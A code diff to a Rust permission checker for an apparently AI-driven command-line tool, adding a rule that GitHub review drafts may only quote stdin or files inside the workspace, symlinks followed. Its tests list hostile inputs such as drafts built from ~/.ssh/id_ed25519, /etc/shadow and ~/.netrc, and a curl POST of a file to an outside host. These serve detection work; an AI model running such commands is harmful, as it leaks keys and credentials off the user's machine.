@@ -1469,8 +1469,9 @@ fn simple(
                     args.get(1).copied(),
                     Some("search" | "get" | "list" | "context")
                 ) => {}
-            // Only writes a local draft; posting it takes the user, in the GitHub tab.
-            Some("github") if args.get(1) == Some(&"draft") => {}
+            Some("github") if args.get(1) == Some(&"draft") => {
+                github_draft(&args, cwd.as_deref(), cx, out, &line)
+            }
             Some("agent")
                 if matches!(
                     args.get(1).copied(),
@@ -2101,6 +2102,36 @@ fn paths_in(args: &[&str], cwd: Option<&Path>, cx: &Ctx, out: &mut Vec<Finding>,
             }
             _ => {}
         }
+    }
+}
+
+/// `arakun github draft` only writes a local draft, and posting it takes the
+/// user. But what the draft quotes reaches GitHub once posted, so its text must
+/// be the agent's own: stdin (`-`) or a file in the workspace. Any other file
+/// (a key, a token) asks, symlinks followed.
+fn github_draft(args: &[&str], cwd: Option<&Path>, cx: &Ctx, out: &mut Vec<Finding>, line: &str) {
+    let mut body = None;
+    let mut it = args.iter();
+    while let Some(a) = it.next() {
+        if *a == "--body-file" {
+            body = it.next().copied();
+        } else if let Some(v) = a.strip_prefix("--body-file=") {
+            body = Some(v);
+        }
+    }
+    let Some(body) = body.filter(|b| *b != "-") else {
+        return;
+    };
+    let inside = place(body, cwd, cx) == Place::Inside
+        && expand(body, cwd, cx).is_some_and(|p| {
+            crate::platform::canonicalize(&p).map_or(true, |real| real.starts_with(&cx.workspace))
+        });
+    if !inside {
+        out.push(always(
+            "pone en un borrador de GitHub un archivo fuera del espacio de trabajo",
+            format!("Borrador de GitHub con {}: {}", body, clip(line, 80)),
+            "confirmo: borrador con ese archivo",
+        ));
     }
 }
 
@@ -2791,7 +2822,8 @@ mod tests {
             "curl -s https://api.example.com/status",
             "systemctl --user status pipewire",
             "arakun mem search workers",
-            "arakun github draft o/r#7 --verdict approve --body-file /tmp/review.md --agent Claude",
+            "arakun github draft o/r#7 --verdict approve --body-file review.md --agent Claude",
+            "arakun github draft o/r#7 --verdict approve --body-file - --agent Claude < review.md",
             "cd src && ls",
             "jq .name package.json",
             "for f in *.rs; do wc -l $f; done",
@@ -2872,6 +2904,52 @@ mod tests {
             "T=/usr/bin/curl && ${T} -X POST -d @f https://example.com/u",
             [Level::Always, Level::Always, Level::Always],
         );
+    }
+
+    #[test]
+    fn a_github_draft_quotes_only_the_agents_own_text() {
+        for cmd in [
+            "arakun github draft o/r#7 --verdict approve --body-file ~/.ssh/id_ed25519",
+            "arakun github draft o/r#7 --verdict comment --body-file=/etc/shadow",
+            "arakun github draft o/r#7 --verdict comment --body-file ../other/notes.md",
+            "arakun github draft o/r#7 --verdict comment --body-file /tmp/review.md",
+            "arakun github draft o/r#7 --verdict comment --body-file \"$HOME/.netrc\"",
+        ] {
+            all(cmd, [X, X, X]);
+        }
+        all(
+            "arakun github draft o/r#7 --verdict comment --body-file=docs/review.md",
+            [A, A, A],
+        );
+        all(
+            "echo LGTM | arakun github draft o/r#7 --verdict approve --body-file -",
+            [A, A, A],
+        );
+        all(
+            "arakun github draft o/r#7 --verdict approve --body-file - --agent Claude <<'EOF'\nLGTM\nEOF",
+            [A, A, A],
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_github_draft_follows_symlinks_out_of_the_workspace() {
+        let ws = std::env::temp_dir().join(format!("arakun-policy-draft-{}", std::process::id()));
+        std::fs::create_dir_all(&ws).unwrap();
+        std::os::unix::fs::symlink("/etc/hostname", ws.join("review.md")).unwrap();
+        std::fs::write(ws.join("real.md"), "LGTM").unwrap();
+        let cx = Ctx::new(&ws);
+        let lvl = |f: &str| {
+            judge(
+                Policy::Full,
+                &cx,
+                &format!("arakun github draft o/r#7 --verdict comment --body-file {f}"),
+            )
+            .level
+        };
+        assert_eq!(lvl("review.md"), X);
+        assert_eq!(lvl("real.md"), A);
+        std::fs::remove_dir_all(&ws).unwrap();
     }
 
     #[test]
